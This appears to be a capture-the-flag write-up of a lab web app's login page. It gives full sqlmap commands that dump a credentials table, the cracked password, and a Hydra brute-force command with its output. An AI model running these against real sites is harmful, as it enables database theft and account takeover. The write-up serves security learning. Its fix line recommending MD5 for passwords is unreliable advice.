# Brute Force Sign In
- Method 1: Because members page was vulnerable to an sql injection attack we can enumerate databases for credentials.
- Method 2: Theres no limit to sign in requests so we can brute force it.

# Vulnerability Method 1
- After Executing the command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" --dbs__ we notice a database named **Member_Brute_Force**
- This command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force --tables__ shows us a table named **db_default**
- This command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force -T db_default --dump__ dumps us enteries in that table.
- We can crack those password by running a Dictionary attack specifically 'md5_generic_passwd' provided by sqlmap.
- the result is as follows:
    Database: Member_Brute_Force
    Table: db_default
    [2 entries]
+----+----------+-------------------------------------------+
| id | username | password                                  |
+----+----------+-------------------------------------------+
| 1  | root     | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
| 2  | admin    | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
+----+----------+-------------------------------------------+
- Now we can access this website as admin and root.

# Vulnerability Method 2
- In our particular case, we know that the username admin exists, which will be our target.
- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt wordlist to use in this case.
- We can use Thc-Hydra: __sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:S=<Success-html-text>"__
- In our case the command would be __sudo hydra -l admin -P /Darkly/04_brute_force_sign-in/Ressources/wordlist.txt 192.168.1.38 http-get-form "/:page=signin&username=admin&password=^PASS^&Login=Login:S=flag"__
- Result is => [80][http-get-form] host: 192.168.1.38   login: admin   password: shadow
- We can also use that for "root" user.
- Also the password is exposed because the form method is GET.
  
# Fix
- We can prevent SQL injections by using prepared statements and parameterized queries.
- Passwords should md5 encrypted because its a weak hashing algorithm.
- We can set limit to request sent by clients.
- We can use POST method when handling passwords and generaly handling form data to prevent exposure.